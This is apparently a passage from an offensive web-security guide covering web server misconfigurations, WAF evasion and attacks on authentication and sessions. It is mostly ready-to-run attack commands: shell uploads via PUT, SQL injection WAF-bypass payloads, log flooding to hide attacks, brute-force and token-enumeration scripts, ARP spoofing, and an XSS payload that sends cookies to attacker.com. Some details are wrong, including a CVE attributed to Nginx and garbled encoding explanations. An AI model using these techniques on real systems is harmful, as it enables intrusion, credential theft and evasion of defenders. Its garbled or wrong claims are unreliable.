AuthUserFile /var/www/.htpasswd
AuthType Basic
require valid-user
# htpasswd files often contain weak passwords or reused credentials
```

**Apache on Windows:**

```cmd
# Installation typically via MSI installer
# Configuration paths:
C:\Apache24\conf\httpd.conf
C:\Apache24\htdocs\           # Default document root

# Start/stop Apache service
net start Apache2.4
net stop Apache2.4
```

---

### Nginx

Nginx is lightweight, event-driven architecture; increasingly prevalent in modern deployments and container environments.

**Installation (Kali/Debian):**

```bash
apt-get install nginx
systemctl start nginx
systemctl status nginx
```

**Configuration file:**

```
/etc/nginx/nginx.conf          # Main configuration
/etc/nginx/sites-available/    # Virtual host definitions
/etc/nginx/sites-enabled/      # Enabled virtual hosts (symlinks)
/etc/nginx/conf.d/             # Additional configuration files
```

**Basic configuration structure:**

```nginx
http {
    upstream backend {
        server backend1.example.com:8080;
        server backend2.example.com:8080;
    }
    
    server {
        listen 80;
        server_name example.com;
        
        location / {
            proxy_pass http://backend;
            proxy_set_header Host $host;
        }
        
        location /admin {
            deny all;  # Access control
        }
    }
}
```

**Key differences from Apache:**

- No `.htaccess` override mechanism (all configuration centralized)
- Simpler module system (modules compiled in or loaded via `load_module`)
- Location blocks for path-based routing (more flexible than Apache Directory blocks)
- Reverse proxy primary use case

**Virtual host configuration:**

```nginx
server {
    listen 80;
    server_name example.com www.example.com;
    
    root /var/www/html;
    index index.html index.htm;
    
    location ~ \.php$ {
        fastcgi_pass unix:/run/php-fpm.sock;
        fastcgi_index index.php;
    }
}
```

**Location matching priorities (exploitable for routing confusion):**

```nginx
# Exact match (highest priority)
location = /admin { }

# Prefix match
location /api { }

# Regular expression match (case-sensitive)
location ~ \.php$ { }

# Regular expression match (case-insensitive)
location ~* \.jpg$ { }

# Prefix match (lowest priority)
location / { }
```

**Exploitation via location confusion:**

```nginx
# Misconfiguration allowing bypass
location /admin {
    deny all;
}

location /admin.php {
    proxy_pass http://backend;  # Proxy backend processes admin.php
}

# Access: /admin.php -> bypasses deny rule but still processes PHP
```

**Reverse proxy configuration vulnerabilities:**

```nginx
location /api/ {
    proxy_pass http://backend:8080/;  # Note trailing slash handling
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}

# Trailing slash differences:
# /api/users -> http://backend:8080/users (slash removed)
# /apiusers -> http://backend:8080/users (no slash to process)
```

**Nginx status page (if enabled):**

```bash
# Often accessible via /nginx_status
curl http://example.com/nginx_status

# Shows active connections, accepts, handled, requests
# Reveals traffic patterns and potential DoS attacks
```

**FastCGI split path vulnerability (CVE-2019-9193):**

```nginx
# Vulnerable configuration
location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_index index.php;
    include fastcgi_params;
}

# Allows execution of arbitrary files with PHP extension
# /index.jpg%00.php -> uploaded JPG executed as PHP
```

**Nginx on Windows:**

```cmd
# Installation via zip archive
# Configuration: nginx.conf in installation directory
C:\nginx\conf\nginx.conf
C:\nginx\html\               # Default document root

# Start/stop (no service, run manually)
cd C:\nginx
nginx.exe
taskkill /F /IM nginx.exe
```

---

### Internet Information Services (IIS)

IIS is Microsoft's web server; Windows-specific with integration into Active Directory and Windows ecosystem.

**Installation (Windows Server):**

```powershell
Install-WindowsFeature -Name Web-Server -IncludeAllSubFeature
Get-WindowsFeature | Where { $_.Name -like "Web*" }  # Verify installation
```

**Configuration and management:**

IIS uses graphical management interface (IIS Manager) and `applicationHost.config`:

```
C:\Windows\System32\inetsrv\config\applicationHost.config  # Main configuration
C:\inetpub\wwwroot\                                         # Default document root
C:\Windows\System32\LogFiles\                               # Log files
```

**Application pool and process identity:**

```powershell
# IIS runs application pools, each with separate process identity
Get-IISAppPool
Get-IISAppPool | Select-Object Name, ManagedRuntimeVersion, ManagedPipelineMode
```

**AppPool identity exploitation considerations:**

Application pools run as specific identities (ApplicationPoolIdentity, NETWORK SERVICE, SYSTEM). Identity determines file access permissions.

```powershell
# Query AppPool identity
Get-IISAppPool -Name "DefaultAppPool" | Select-Object ProcessModel
```

**IIS authentication mechanisms:**

```
Anonymous Authentication      # No credentials required
Basic Authentication          # Username/password over HTTP (credentials in header)
Windows Authentication        # NTLM/Kerberos (Active Directory)
Digest Authentication         # Improved Basic (challenge-response)
Forms Authentication          # Cookie-based (application-level)
```

**web.config (IIS application configuration):**

```xml
<?xml version="1.0"?>
<configuration>
    <system.webServer>
        <security>
            <authentication>
                <anonymousAuthentication enabled="false" />
                <basicAuthentication enabled="true" />
            </authentication>
        </security>
        <handlers>
            <add name="PHP" path="*.php" verb="*" 
                 modules="FastCgiModule" scriptProcessor="C:\php\php-cgi.exe" />
        </handlers>
        <rewrite>
            <rules>
                <rule name="Redirect HTTP to HTTPS" stopProcessing="true">
                    <match url="(.*)" />
                    <conditions>
                        <add input="{HTTPS}" pattern="^OFF$" />
                    </conditions>
                    <action type="Redirect" url="https://{HTTP_HOST}/{R:1}" />
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration>
```

**URL Rewrite module (IIS equivalent to Apache mod_rewrite):**

Rewrite rules in web.config can introduce routing vulnerabilities:

```xml
<rule name="Proxy API" stopProcessing="true">
    <match url="^api/(.*)" />
    <action type="Rewrite" url="http://backend:8080/api/{R:1}" />
</rule>
```

**IIS specific vulnerabilities:**

**WebDAV exploitation:** If WebDAV enabled, arbitrary file upload possible.

```powershell
# Check if WebDAV enabled
Get-WindowsFeature Web-DAV-Publishing

# WebDAV methods: PROPFIND, PUT, DELETE, MOVE, LOCK
# Upload file via PUT
curl -X PUT -d "@file.aspx" http://example.com/uploads/file.aspx.txt
```

**IIS short filename enumeration (8.3 format):**

NTFS supports legacy 8.3 filename format; IIS may expose short names.

```bash
# Enumerate files via short names
curl -I http://example.com/LONGFI~1.txt  # Maps to LONGFILENAME.txt if exists
curl -I http://example.com/ADMINI~1      # Enumerate directories
```

**IIS buffer overflow in older versions (legacy):**

[Unverified] Older IIS versions (5.0, 6.0) had remote code execution vulnerabilities; modern IIS significantly more hardened.

**IIS on non-standard ports:**

```bash
# IIS often runs on standard ports but test alternatives
nmap -p 80,443,8080,8443,8888 example.com
```

---

## Common Configurations and Misconfigurations

### Default Configurations

Default configurations often leave sensitive functionality accessible.

**Apache defaults:**

```bash
# Default document root with index listing enabled
curl http://example.com/
# Shows directory listing if Options Indexes enabled

# Server status page
curl http://example.com/server-status
# Reveals current connections, processes, modules

# Server info page
curl http://example.com/server-info
# Full configuration details
```

**Nginx defaults:**

```bash
# Nginx welcome page (if no custom index)
curl http://example.com/
# "Welcome to nginx!"

# Status page (if enabled)
curl http://example.com/nginx_status
```

**IIS defaults:**

```bash
# Default IIS page
curl http://example.com/
# Shows IIS version and configuration info

# ISAPI modules might expose version
curl -I http://example.com/
# Server header often reveals IIS version
```

**FTP/Anonymous access:**

Default FTP often allows anonymous login.

```bash
ftp example.com
# Login: anonymous
# Password: anything@email.com
```

---

### Privileged Directory Access

Directories meant for administrative use often left accessible without authentication.

**Apache:**

```bash
# /admin directory commonly left open
curl http://example.com/admin/
curl http://example.com/admin/login.php

# /uploads directory often writeable
curl -X PUT -d "@shell.php" http://example.com/uploads/shell.php

# /backup directory with source code or database dumps
curl http://example.com/backup/
curl http://example.com/backup/database.sql

# .git directory exposure
curl http://example.com/.git/config
```

**Nginx:**

Similar vulnerabilities as Apache; location block misconfiguration allows access.

```bash
# Nginx allows serving from unintended locations
curl http://example.com/../../etc/passwd  # Path traversal via proxy misconfiguration
```

**IIS:**

```bash
# Web.config exposure
curl http://example.com/web.config
# Often contains database credentials, API keys

# bin directory with compiled assemblies
curl http://example.com/bin/
curl http://example.com/bin/application.dll

# App_Data directory (IIS default for application data)
curl http://example.com/App_Data/
# May contain database files, configuration
```

---

### Symbolic Link and Directory Traversal

Misconfigurations allowing access outside intended directory.

**Apache with FollowSymLinks enabled:**

```bash
# If FollowSymLinks enabled in configuration
<Directory /var/www/html>
    Options FollowSymLinks
</Directory>

# Attacker creates symlink
ln -s /etc/passwd /var/www/html/passwd.txt

# Access via web
curl http://example.com/passwd.txt
# Returns /etc/passwd contents
```

**Directory traversal via path normalization:**

```bash
# Request normalizes differently than server expects
curl http://example.com/admin/..%2fadmin
# Some servers normalize to /admin (access granted)
# Others don't normalize, treat as literal path (access denied)

# Double encoding bypass
curl http://example.com/%252e%252e/admin
# %25 encodes %, so %252e is %2e (.) URL-encoded
# Server decodes once: /./ (ignored)
# Access intended path
```

**Nginx location block bypass:**

```nginx
# Misconfigured location blocks
location /admin/ {
    deny all;
}

location ~ ^/admin$ {
    proxy_pass http://backend;
}

# Request to /admin/ denied
# Request to /admin with trailing logic handled by backend
```

---

### File Type and Extension Handling

Mishandled file types lead to arbitrary code execution or information disclosure.

**Double extension vulnerability:**

```bash
# Upload shell.php.jpg
# Server processes as JPG (safe)
# Application processes as PHP (dangerous)
curl -X POST -F "file=@shell.php.jpg" http://example.com/upload.php

# Depends on handler configuration
# Apache with AddType php .php processes only .php
# Nginx with fastcgi interprets based on config
```

**Null byte injection (legacy):**

```bash
# Request shell.php%00.jpg
# String terminates at null byte
# Server handles as shell.php, not shell.php.jpg
# Deprecated vulnerability; modern systems handle properly
```

**.htaccess misconfigurations (Apache):**

```apache
# Overly broad execution permissions
AddType application/x-httpd-php .jpg .txt .gif

# Allows any uploaded image to execute as PHP
```

**Case sensitivity confusion:**

```bash
# Windows/IIS case-insensitive
# Request: shell.PhP or shell.pHP
# Both process as PHP

# Linux case-sensitive
# shell.php processes as PHP
# shell.PHP does not (unless AddType .PHP)
```

**Content-Type bypass:**

```bash
# Upload file with crafted Content-Type header
curl -X POST \
  -H "Content-Type: image/jpeg" \
  -F "file=@shell.php" \
  http://example.com/upload.php

# Server validates Content-Type header only (not file magic bytes)
# PHP file executes despite Content-Type: image/jpeg
```

---

### Insecure Redirect and Open Redirect

Redirection misconfigurations allow attacker-controlled destinations.

**Apache mod_rewrite open redirect:**

```apache
RewriteCond %{QUERY_STRING} ^redirect=(.*)$
RewriteRule ^index\.php$ %1 [R,L]

# Request: index.php?redirect=http://attacker.com
# Redirects to http://attacker.com (user trusts original domain)
```

**Nginx open redirect:**

```nginx
location /login {
    set $redirect $arg_redirect;
    return 302 $redirect;
}

# Request: /login?redirect=http://attacker.com
# Redirects to attacker's site
```

**IIS URL Rewrite open redirect:**

```xml
<rule name="Redirect" stopProcessing="true">
    <match url="^login\.aspx" />
    <action type="Redirect" url="{QueryString}" />
</rule>
```

**Exploitation:**

```bash
# Attacker crafts link
http://example.com/login?redirect=http://attacker.com/fake-login

# User clicks link, sees original domain, trusts it
# Redirects to attacker's fake login
# User enters credentials into attacker's site
```

---

### Insecure SSL/TLS Configuration

Weak cryptographic configurations expose encryption to attack.

**Weak cipher suites:**

```bash
# Server accepts obsolete ciphers
openssl s_client -connect example.com:443 -cipher 'DES-CBC3-SHA'

# DES (56-bit key) brute-forceable
# RC4 has known biases
# MD5 hash collisions possible
```

**SSL/TLS version vulnerabilities:**

```bash
# Server accepts deprecated TLS versions
openssl s_client -connect example.com:443 -ssl3   # SSLv3 (POODLE attack)
openssl s_client -connect example.com:443 -tls1   # TLS 1.0 (BEAST, CRIME)
```

**Self-signed certificates:**

```bash
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text -noout | grep -E "Subject:|Issuer"
# Subject and Issuer identical for self-signed

# Browser warnings indicate man-in-the-middle vulnerability
```

**Certificate pinning bypass:**

[Inference] Some applications implement certificate pinning to prevent MITM attacks; misconfigured pinning can be exploited or bypassed with proper certificate chain manipulation.

**Heartbleed detection (OpenSSL vulnerability):**

```bash
# Server vulnerable to OpenSSL heartbeat information leak
openssl s_client -connect example.com:443 -tlsextdebug 2>&1 | grep -i heartbeat
```

---

### Unencrypted Communication

Data transmitted without encryption vulnerable to interception.

**Mixed content warning (HTTPS page loading HTTP resources):**

```html
<!-- Page served over HTTPS -->
<script src="http://example.com/script.js"></script>
<img src="http://cdn.example.com/image.jpg" />

<!-- Scripts and images loaded insecurely -->
<!-- Attacker intercepts HTTP and injects malicious content -->
```

**HSTS bypass:**

```bash
# First request to HTTPS domain might be HTTP
# HSTS not yet known by browser
curl -v http://example.com

# First response includes HSTS header
# Subsequent requests forced to HTTPS
# But first request vulnerable
```

**Downgrade attacks:**

```bash
# Server accepts both HTTP and HTTPS
# Attacker strips HTTPS requirement
# Cookie set with Secure flag not sent over HTTP
# Attacker steals session cookie
```

---

### Information Disclosure in Error Pages

Detailed error messages leak configuration and source code.

**Apache error pages:**

```bash
# Request non-existent file
curl http://example.com/nonexistent.php

# Error reveals: full path, PHP version, modules loaded, server OS
```

**Nginx error pages:**

```bash
# Nginx errors typically minimal
curl http://example.com/nonexistent

# Returns "404 Not Found" without excessive detail
# Depends on error_page configuration
```

**IIS error pages:**

```bash
# IIS default error pages very detailed
curl http://example.com/nonexistent.aspx

# Shows: ASP.NET version, handler mappings, framework version, detailed stack traces
```

**Custom error page misconfiguration:**

```apache
# ErrorDocument directive leaking information
ErrorDocument 500 "Error: Database connection failed at /var/www/db.php line 45"
ErrorDocument 404 "File not found: /home/admin/uploads"
```

---

### Unnecessary Services and Ports

Misconfigured servers run unnecessary services increasing attack surface.

**Port scanning reveals exposed services:**

```bash
nmap -sV example.com

# Port 21 - FTP (unnecessary if SFTP/HTTPS available)
# Port 23 - Telnet (unencrypted, dangerous)
# Port 25 - SMTP (mail server often should be separate)
# Port 3306 - MySQL (database should not be internet-exposed)
# Port 5432 - PostgreSQL (should be internal-only)
# Port 6379 - Redis (cache should be internal-only)
# Port 27017 - MongoDB (should be internal-only)
```

**Service enumeration via nmap scripts:**

```bash
nmap --script=default -p 3306 example.com
# Reveals MySQL version, available databases (if accessible)

nmap --script=redis-info -p 6379 example.com
# Reveals Redis version, data size, replication info
```

---

## Web Application Firewalls (WAF)

### WAF Detection and Identification

Detecting WAF presence and identifying product allows targeted bypass techniques.

**WAF signature identification via response headers:**

```bash
curl -I http://example.com

# CloudFlare
# Server: cloudflare-nginx
# cf-ray: [id]

# Akamai
# Server: AkamaiGHost
# akamai-x-cache: from/to cache

# AWS WAF
# Varies; often in error pages

# ModSecurity (Apache module)
# Identifies by error page format: 403 Forbidden (ModSecurity Generated Response)

# Imperva/SecureSphere
# Server: Imperva
# X-CDN-Request-Id
```

**Fingerprinting via error responses:**

```bash
# Send obviously malicious payload
curl "http://example.com/index.php?id=1' OR '1'='1"

# WAF blocks and responds with specific error page format
# Different WAFs have different error page styles
# CloudFlare: "1020 Access denied"
# AWS WAF: "AWS WAF Access Denied"
# Imperva: Default error page with specific styling
```

**Timing-based detection:**

```bash
# Measure response time differences
time curl http://example.com/normal
time curl "http://example.com/index.php?id=1' OR '1'='1"

# WAF processes blocked requests longer (logging, analysis)
# Legitimate requests process faster
```

**Tool-based WAF identification:**

```bash
# wafw00f - Automated WAF detection
wafw00f http://example.com

# Output identifies suspected WAF, confidence level, and bypass techniques
```

---

### WAF Bypass Techniques

WAF bypasses exploit parsing inconsistencies between WAF and backend server.

**Case mutation:**

```bash
# WAF checks for lowercase patterns
curl "http://example.com/index.php?id=1' UnIoN sElEcT 1,2,3--"

# SQL injection: UNION SELECT (common detection pattern)
# Bypass: UnIoN sElEcT (case mutation confuses rule engines)

# Effectiveness: Depends on WAF; some normalize case before matching
```

**Encoding bypasses:**

```bash
# URL encoding bypass:

# WAF checks unencoded payload
curl "http://example.com/index.php?id=1%27%20OR%20%271%27=%271"
# %27 = ', %20 = space
# Backend decodes and processes SQL injection

# Double encoding bypass
curl "http://example.com/index.php?id=1%252527%2520OR%2520%252527%25271%2527=%2527%25271"
# %2525 = %25 (second-level encoding)

# Alternative: HTML entity encoding
# &lt; = 
# &gt; = >
# Not effective for SQL but used in XSS bypasses
```

**Comment injection (SQLi context):**

```bash
# WAF blocks: ' OR '1'='1
# Bypass with database-specific comments

# MySQL comments
curl "http://example.com/index.php?id=1' OR /*!50000'1'='1"
# /*!50000 */ syntax executes only on MySQL version 5.0.0+

# MSSQL comments
curl "http://example.com/index.php?id=1' OR '1'/*='1"

# PostgreSQL comments
curl "http://example.com/index.php?id=1' OR '1'--comment"
```

**Whitespace and null byte manipulation:**

```bash
# WAF checks specific patterns with standard whitespace
curl "http://example.com/index.php?id=1' OR '1'='1"

# Bypass with tab, newline, null byte
curl "http://example.com/index.php?id=1'%09OR%09'1'='1"      # Tab
curl "http://example.com/index.php?id=1'%0aOR%0a'1'='1"      # Newline
curl "http://example.com/index.php?id=1'%00OR%00'1'='1"      # Null byte (legacy)

# Backend processes; WAF may not
```

**Polyglot payloads:**

```bash
# Payload valid in multiple contexts; bypasses context-specific filters

# JavaScript polyglot (valid as JS and HTML)
<script>
var x = "<!-- </script><img src=x onerror=alert('xss')> -->";
</script>

# SVG/XML polyglot
<svg onload=alert('xss')><!--
--><?xml version="1.0"?>
```

**Metric conversion bypass:**

```bash
# WAF blocks requests exceeding size limit
# Attacker fragments payload into multiple requests

# Request 1: Sets variable/session
curl "http://example.com/page.php?var=payload_part_1"

# Request 2: Completes payload
curl "http://example.com/page.php?var=payload_part_2&execute=1"

# Backend combines; WAF sees each request as individual, passes them
```

**Parameter pollution:**

```bash
# Multiple parameters with same name; parsing differs between WAF and backend

# WAF sees first parameter (benign)
# Backend takes last parameter (malicious)
curl "http://example.com/page.php?id=1&id=1' OR '1'='1"

# Different platforms handle conflicts differently (covered in URL parsing section)
```

**HTTP verb tampering:**

```bash
# WAF checks specific HTTP methods; backend may process others

curl -X POST http://example.com/login  # Blocked by WAF
curl -X INVALID http://example.com/login  # WAF passes, backend defaults to POST

# Effectiveness limited; most WAFs check all methods
```

**Header-based bypass:**

```bash
# Craft requests mimicking legitimate traffic patterns

# X-Forwarded-For header (suggests proxy)
curl -H "X-Forwarded-For: 127.0.0.1" "http://example.com/admin"
# Some WAFs bypass internal IPs

# User-Agent bypass
curl -H "User-Agent: Googlebot" "http://example.com/admin"
# WAFs sometimes whitelist search engines

# X-Requested-With: XMLHttpRequest
curl -H "X-Requested-With: XMLHttpRequest" "http://example.com/admin"
# AJAX requests sometimes less scrutinized
```

**Rate limit and IP rotation:**

```bash
# WAF implements rate limiting to prevent brute force
# Attacker rotates IPs to avoid rate limits

# Using proxy list
for ip in $(cat proxy_list.txt); do
  curl -x $ip "http://example.com/brute?user=admin&pass=attempt$RANDOM"
done

# Using residential proxies (legitimate IPs, harder to block)
# Effectiveness depends on proxy quality and WAF sophistication
```

---

### WAF Evasion via Protocol Differences

HTTP/2 and HTTP/3 parse headers differently than HTTP/1.1; WAF may not properly analyze.

**HTTP/2 pseudo-headers evasion:**

```bash
# HTTP/2 uses pseudo-headers (prefix with :)
# Some WAFs process standard headers but miss pseudo-headers

# HTTP/1.1 equivalent
curl -H "Host: example.com" "http://example.com/page"

# HTTP/2 pseudo-header confusion
# (Requires HTTP/2 client)
# :authority: example.com
# :path: /page?id=1' OR '1'='1
# WAF may not properly parse pseudo-header payloads
```

**HTTP request smuggling (protocol desynchronization):**

```bash
# WAF and backend parse headers differently
# Create desynchronization between what WAF sees and what backend processes

# Vulnerable if WAF and backend disagree on request boundaries

# Example: Content-Length vs Transfer-Encoding
POST /page HTTP/1.1
Host: example.com
Content-Length: 15
Transfer-Encoding: chunked

BENIGN_PAYLOAD
8
MALICIOUS
0

# WAF sees Content-Length (15 bytes) = BENIGN_PAYLOAD
# Backend sees Transfer-Encoding (chunks) = MALICIOUS
# [Unverified] Specific vulnerability; requires specific configuration
```

---

### WAF Logging and Evasion via Noise

```bash
# Generate high volume of blocked requests to flood WAF logs
# Legitimate attack gets lost in noise

for i in {1..10000}; do
  curl "http://example.com/page?id=1' OR '1'='1" &
done

# Security teams overwhelmed by alerts
# Actual attack passes unnoticed
# [Inference] Sophisticated detection systems correlate patterns; effectiveness limited

# Stealth approach: Slow, distributed attacks
# Single request every few seconds from rotating IPs
# Below rate limits, mimics legitimate traffic
```

---

### Common WAF Bypass Tools

**SQLmap with WAF bypass:**

```bash
sqlmap -u "http://example.com/page?id=1" \
  --technique=T \
  --tamper=space2comment,between \
  --user-agent="Mozilla/5.0" \
  --random-agent

# --technique=T: Time-based blind SQLi (harder to detect)
# --tamper: Applies transformations to payloads (case mutation, encoding, etc.)
# --random-agent: Rotates User-Agent headers
```

**WAFNinja (automated WAF testing):**

```bash
wafninja.py -u "http://example.com" \
  -t GET \
  --checkwaf \
  --testparameter id
```

**Bypass testing methodology:**

```bash
# 1. Identify WAF
wafw00f http://example.com

# 2. Test basic payload
curl "http://example.com/page?id=1' OR '1'='1"
# Likely blocked

# 3. Attempt single bypass technique
curl "http://example.com/page?id=1' /*!50000OR*/ '1'='1"

# 4. If blocked, attempt next technique (encoding, mutation, etc.)

# 5. Combine techniques
curl "http://example.com/page?id=1%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%201,2"
# %27 = ', %75%6e%69%6f%6e = union, etc.

# 6. If all fail, consider modifying request structure (HTTP verb, headers, protocol)
```

---

### WAF Configuration Assessment

Legitimate security misconfiguration in WAF rules creates bypasses.

**Over-broad blocking rules:**

```bash
# WAF blocks all requests containing "admin" string
curl http://example.com/page?section=administration  # Blocked (contains admin)

# Bypass: Use synonym
curl http://example.com/page?section=management

# WAF blocks wildcard patterns too broadly
# Rule: Block *admin*
# Over-blocks legitimate admin_logs, administrator, administer-related pages
```

**Rule conflicts and ordering:**

```bash
# Multiple WAF rules may conflict

# Rule 1: Block %20%20 (double space encoded)
# Rule 2: Allow %20 (encoded space)

# Payload: %20%20 -> Decoded to "  " (two spaces)
# Rule order determines outcome
```

**Protocol-specific rule gaps:**

```bash
# WAF rules written for HTTP/1.1
# HTTP/2 request bypasses rules due to header structure differences

# Example: Rule looks for "Authorization:" header
# HTTP/2 pseudo-header: ":authority:" (different format)
# Rule doesn't match pseudo-header, payload passes
```

**Session handling gaps:**

```bash
# WAF doesn't properly track session state
# Attacker establishes authenticated session, then performs reconnaissance
curl -b "SESSIONID=legitimate_token" "http://example.com/admin"

# WAF may trust authenticated sessions with less scrutiny
# Admin endpoints bypass normal security checks
```

---

### Web Application Firewall Logging and Monitoring

Understanding WAF logging assists in crafting harder-to-detect attacks.

**WAF log format analysis:**

```bash
# Typical WAF log entry
2025-10-14 14:23:45 BLOCKED 192.0.2.100 GET /page?id=1' OR '1'='1 403 SQLi_Injection_Rule_001

# Fields: timestamp, action, source IP, method, request, response code, rule triggered

# Attacker analysis: Understands which rules detect which attacks
```

**Blind WAF interaction testing:**

```bash
# Attacker cannot see WAF directly; uses backend response as feedback

# Payload 1: Verify SQLi possible
curl "http://example.com/page?id=1 AND 1=1"
curl "http://example.com/page?id=1 AND 1=2"
# Compare responses: different = SQLi likely successful

# Payload 2: Test WAF rule 1
curl "http://example.com/page?id=1' OR '1'='1"
# 403 response = WAF rule triggered

# Payload 3: Test bypass technique
curl "http://example.com/page?id=1' /*!50000OR*/ '1'='1"
# 200 response = Bypass successful

# Payload 4: Extract data (WAF bypassed)
curl "http://example.com/page?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,user(),3--"
```

---

### Additional WAF Considerations

**Distributed attack coordination:**

Multiple attackers coordinate from different IPs, timing attacks to avoid individual rate limits.

```bash
# Attacker 1: Tuesday 10:00 AM
curl "http://example.com/admin" -H "X-Forwarded-For: 198.51.100.1"

# Attacker 2: Tuesday 10:05 AM
curl "http://example.com/admin" -H "X-Forwarded-For: 203.0.113.1"

# Attack appears distributed and low-rate to WAF
```

**Legitimate service bypass:**

```bash
# Attacker uses legitimate services (search engines, CDNs, cloud services)
# to make requests on their behalf

# Example: Using Google's crawlers
# Hard to block Google without impacting SEO
# [Inference] Effectiveness limited; cloud services typically have rate limiting
```

**Zero-day WAF filters:**

[Unverified] Novel vulnerability in WAF rules not yet documented or patched; requires custom reconnaissance and testing for each WAF instance.

---

# Authentication & Session Management

## Authentication Mechanisms

Authentication mechanisms verify user identity through various methods. Understanding implementation details reveals bypass opportunities, credential leakage, and cryptographic weaknesses.

**Basic Authentication**

Basic authentication encodes credentials as Base64 in the HTTP Authorization header:

```
Authorization: Basic base64(username:password)
```

Decode base64-encoded credentials:

```bash
echo "dXNlcm5hbWU6cGFzc3dvcmQ=" | base64 -d
# Output: username:password

# Intercept with Burp Suite
# Right-click request â†’ Copy as curl â†’ Modify Authorization header
curl -u username:password https://target.com/api/endpoint
curl -H "Authorization: Basic $(echo -n 'username:password' | base64)" https://target.com
```

[Inference] Basic authentication credentials traverse in easily-reversible Base64 encoding. Always transmitted over HTTPS in legitimate applications; HTTP transmission allows credential interception.

**Digest Authentication**

Digest authentication uses cryptographic challenge-response avoiding plaintext credential transmission:

```
Authorization: Digest username="user", realm="Protected Area",
nonce="abc123", uri="/protected", response="6629fae49393a05397450978507c4ef1"
```

Attack vectors include:

```bash
# Capture challenge-response
# Attempt MD5 hash cracking (weak algorithm)
hashcat -m 500 hash.txt /path/to/wordlist.txt

# Username enumeration via different realm responses
curl -I https://target.com/protected

# Replay captured digest with modified parameters
```

[Inference] Digest authentication security depends entirely on HTTPS plus nonce randomness. Many implementations fail to properly validate nonce lifetime or replay tokens.

**Form-Based Authentication**

HTML forms submit credentials via POST requests:

```html
<form method="POST" action="/login">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit">
</form>
```

Common vulnerability patterns:

```bash
# Credential stored in HTML comments
curl -s https://target.com/login | grep -i "username\|password\|credential"

# Plaintext transmission (verify with Burp/browser DevTools)
# POST /login HTTP/1.1
# username=admin&password=Admin123

# Password stored in browser autocomplete
# Inspect password field for autocomplete="off"

# Client-side validation only (bypass via request modification)
# Remove maxlength attribute, modify field value, send raw POST

# Brute force without rate limiting
hydra -L usernames.txt -P passwords.txt https-post-form://target.com/login:username=^USER^&password=^PASS^:F=Invalid
```

**Multi-Factor Authentication (MFA)**

MFA combines multiple authentication factors. Bypass techniques include:

```bash
# TOTP/Time-based One-Time Password attacks
# Capture shared secret from QR code
# Bruteforce 6-digit codes (only 1,000,000 possibilities)
python3 << 'EOF'
import pyotp
import time

secret = "SHARED_SECRET_FROM_QR"
totp = pyotp.TOTP(secret)

for i in range(-1, 2):  # Check current, +/-1 time window
    code = totp.at(time.time() + (i * 30))
    print(f"TOTP Code (window {i}): {code}")
EOF

# SMS-based MFA interception
# Intercept SMS via SS7 attacks (network-level access required)
# Social engineering SIM swap
# Request MFA bypass via account recovery

# Email-based MFA link predictability
# Capture token format from first link
# Attempt to predict subsequent tokens (weak randomization)
```

---

## Session Tokens and Cookies

Session tokens maintain authenticated state across requests. Implementation flaws enable session hijacking, fixation, and impersonation.

**Cookie Structure & Attributes**

```
Set-Cookie: sessionid=abc123def456; Path=/; Domain=target.com; 
            Expires=Wed, 09 Jun 2025 10:18:14 GMT; HttpOnly; Secure; SameSite=Strict
```

Examine cookie attributes:

```bash
# Capture cookies with curl
curl -i https://target.com/login
# Look for Set-Cookie headers

# Browser DevTools inspection
# Open Developer Tools â†’ Application â†’ Cookies â†’ target.com

# Burp Suite cookie analysis
# Proxy tab â†’ Look for Set-Cookie responses
# Repeater tab â†’ Modify Cookie header to test restrictions
```

Critical attributes:

- **HttpOnly**: Prevents JavaScript access (protects against XSS theft)
- **Secure**: Transmits only over HTTPS (prevents plaintext interception)
- **SameSite**: Restricts cross-site cookie transmission (prevents CSRF)
- **Domain**: Scope of cookie visibility
- **Path**: URL path restriction
- **Expires/Max-Age**: Session lifetime

**Session Token Analysis**

Analyze token structure for weaknesses:

```bash
# Decode Base64 tokens
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# Identify token format patterns
# Session tokens often follow: [timestamp][user_id][random]
# Extract components via hex dump
echo "abc123def456" | xxd

# Check for sequential/predictable IDs
# Obtain tokens from multiple users/sessions
# Compare for patterns: incrementing numbers, timestamps, weak randomness

# Bruteforce token space
# If tokens are 32-bit integers: only 4 billion possibilities
# If rate limiting absent: feasible to enumerate

python3 << 'EOF'
import requests
import time

base_url = "https://target.com/api/user"
headers = {"Cookie": "sessionid="}

# Test sequential token values
for token in range(1000000, 1001000):
    headers["Cookie"] = f"sessionid={token}"
    response = requests.get(base_url, headers=headers, timeout=5)
    if response.status_code == 200 and len(response.content) > 100:
        print(f"Valid token found: {token}")
        print(response.text[:200])
EOF

# Capture tokens via network sniffing (if HTTP used)
tcpdump -i eth0 'tcp port 80' -A | grep -i "cookie\|set-cookie"
```

**Session Fixation**

Session fixation allows attackers to set known session tokens for victims:

```bash
# Attacker discovers session token doesn't change post-authentication
# 1. Attacker obtains valid session: sessionid=KNOWN_VALUE
# 2. Attacker tricks victim into visiting: https://target.com/?sessionid=KNOWN_VALUE
# 3. Victim authenticates while using attacker's known token
# 4. Attacker reuses same token to impersonate victim

# Test for fixation vulnerability
# 1. Visit /login with no session
# 2. Capture sessionid from response
# 3. Log in with another user
# 4. Verify if session token remains unchanged

curl -i https://target.com/login
# Capture Set-Cookie: sessionid=ABC

# Manually set cookie and attempt authentication
curl -b "sessionid=ABC" -X POST https://target.com/login \
  -d "username=admin&password=admin"

# If successful authentication preserves sessionid=ABC, fixation vulnerability exists
```

**Session Hijacking & Token Theft**

```bash
# XSS-based cookie theft (requires stored/reflected XSS)
# Attacker injects JavaScript to exfiltrate cookies:
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

# Network interception (on unencrypted HTTP)
# Use Wireshark or tcpdump to capture cookies
wireshark  # GUI-based packet capture
tcpdump -i eth0 'tcp port 80' -w capture.pcap

# Man-in-the-Middle (MITM) via ARP spoofing
arpspoof -i eth0 -t TARGET_IP ROUTER_IP
mitmproxy -p 8080  # Intercept HTTP traffic

# Cookie replay/reuse
# Steal session cookie from victim
# Use stolen cookie in requests to impersonate victim
